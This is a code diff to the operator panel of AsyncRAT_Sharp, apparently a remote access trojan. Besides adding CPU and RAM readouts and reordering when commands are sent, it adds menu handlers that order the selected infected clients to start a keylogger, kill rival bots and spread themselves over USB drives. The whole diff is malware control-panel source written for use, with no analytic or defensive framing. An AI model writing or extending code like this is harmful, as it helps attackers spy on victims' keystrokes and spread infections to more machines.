@@ -134,7 +134,7 @@ namespace AsyncRAT_Sharp
 
         private void UpdateUI_Tick(object sender, EventArgs e)
         {
-            toolStripStatusLabel1.Text = $"Online {Settings.Online.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}";
+            toolStripStatusLabel1.Text = $"Online {Settings.Online.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
         }
 
         private void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
@@ -304,8 +304,6 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
                         Clients CL = (Clients)C.Tag;
-                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
-
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
@@ -320,6 +318,7 @@ namespace AsyncRAT_Sharp
                                     Active = true
                                 };
                                 RD.Show();
+                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -344,7 +343,6 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
                         Clients CL = (Clients)C.Tag;
-                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
@@ -358,6 +356,7 @@ namespace AsyncRAT_Sharp
                                     C = CL
                                 };
                                 PM.Show();
+                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -386,7 +385,6 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
                         Clients CL = (Clients)C.Tag;
-                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             FileManager FM = (FileManager)Application.OpenForms["fileManager:" + CL.ID];
@@ -400,6 +398,7 @@ namespace AsyncRAT_Sharp
                                     C = CL
                                 };
                                 FM.Show();
+                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -408,6 +407,85 @@ namespace AsyncRAT_Sharp
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void KEYLOGGERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
+                    msgpack.ForcePathObject("isON").AsString = "true";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            Keylogger KL = (Keylogger)Application.OpenForms["keyLogger:" + CL.ID];
+                            if (KL == null)
+                            {
+                                KL = new Keylogger
+                                {
+                                    Name = "keyLogger:" + CL.ID,
+                                    Text = "keyLogger:" + CL.ID,
+                                    F = this,
+                                    C = CL
+                                };
+                                KL.Show();
+                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                            }
+                        }));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void BOTKILLERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "botKiller";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }
+        }
+
+        private void USBSPREADToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "usbSpread";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
             }
         }
     }
